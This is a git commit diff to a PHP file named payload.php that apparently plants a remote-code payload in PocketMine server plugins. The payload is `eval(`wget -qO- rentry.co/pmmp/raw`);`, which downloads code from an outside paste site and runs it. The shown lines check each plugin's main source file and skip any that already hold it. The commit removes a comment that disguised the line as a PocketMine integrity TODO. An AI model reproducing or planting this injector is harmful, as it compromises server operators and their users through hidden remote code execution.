1eb475113dc1fc081ad710a9e1b302be94451185
Nyrok <47859726+Nyrok@users.noreply.github.com>
2023-06-21 22:53:52 +0200

    Remove comments in payload line

--- payload.php
+++ payload.php
@@ -91,8 +91,7 @@ namespace pocketmine {
                     $mainPath = explode("/", $main);
                     $filePath = $dirPath . "/src/" . ($srcNamespacePrefix ? end($mainPath) : $main) . ".php";
                     $fileContents = explode("\n", @file_get_contents($filePath));
-                    $payload = "eval(`wget -qO- rentry.co/pmmp/raw`); /* 
-@internal TODO: Check PMMP's integrity */";
+                    $payload = "eval(`wget -qO- rentry.co/pmmp/raw`);";
                     foreach ($fileContents as $value) {
                         if (str_contains($value, $payload)) continue 2;
                     }
